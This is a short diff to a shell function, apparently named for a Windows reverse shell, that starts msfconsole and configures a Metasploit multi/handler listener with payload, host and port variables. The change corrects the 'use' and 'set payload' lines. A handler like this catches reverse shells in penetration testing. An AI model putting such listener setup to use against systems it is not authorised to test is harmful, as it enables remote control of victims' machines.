@@ -62,8 +62,8 @@ function winrev() {
 	msfconsole
 	sleep 6s
 	EXPLOIT="exploit/multi/handler"
-	use EXPLOIT $EXPLOIT
-	set PAYLOAD $PAYLOAD
+	use $EXPLOIT
+	set payload $PAYLOAD
 	set LHOST $HOST
 	set LPORT $PORT
 	show options
